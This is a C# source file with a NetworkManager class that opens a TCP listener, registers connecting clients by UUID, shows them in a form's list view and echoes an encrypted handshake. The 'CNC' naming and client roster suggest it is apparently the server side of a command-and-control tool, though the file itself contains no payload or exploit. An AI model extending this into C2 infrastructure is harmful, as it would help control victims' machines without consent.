using CNC.Config;
using CNC.Core.Data;
using CNC.Core.Helper;
using CNC.Core.Security;
using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC.Core.Networking
{
    static class NetworkManager
    {
        
        public static List<Client> Clients = new List<Client>();


        public static void AddConnection(Connection connection)
        {
            Client client = new Client()
            {
                Connection = connection
            };
            client.Initialize();
            Clients.Add(client);
            Main.MainForm.AddClientToListview(client);
            if(!Properties.Settings.Default.FirstTimeConnect.Contains(client.UUID))
            {
                EventManagement.IncommingEvent(Enums.EventType.FirstTimeConnect, client);
                Properties.Settings.Default.FirstTimeConnect.Add(client.UUID);
                Properties.Settings.Default.Save();
            }
            EventManagement.IncommingEvent(Enums.EventType.Connect, client);
        }

        public static void RemoveConnection(Connection connection)
        {
            Main.MainForm.RemoveClientFromListview(Clients.Find(x => x.Connection == connection));
            EventManagement.IncommingEvent(Enums.EventType.Disconnect, Clients.Find(x => x.Connection == connection));
            Clients.Remove(Clients.Find(x => x.Connection == connection));
        }

        public static void Listen()
        {
            NetworkComms.AppendGlobalConnectionEstablishHandler(OnConnect);
            NetworkComms.AppendGlobalConnectionCloseHandler(OnDisconnect);
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("0x06", (header, connection, incomingMessage) =>
            {
                try
                {
                    connection.SendObject("1x06", Cryptography.Encrypt(Cryptography.Decrypt(incomingMessage)));
                }
                catch
                {

                }

            });
            Connection.StartListening(ConnectionType.TCP, new IPEndPoint(IPAddress.Any, Settings.CNC_PORT));
        }

        public static void Stop()
        {
            NetworkComms.Shutdown();
        }

        private static void OnDisconnect(Connection connection)
        {
            RemoveConnection(connection);
        }

        private static void OnConnect(Connection connection)
        {
            AddConnection(connection);
        }
    }
}
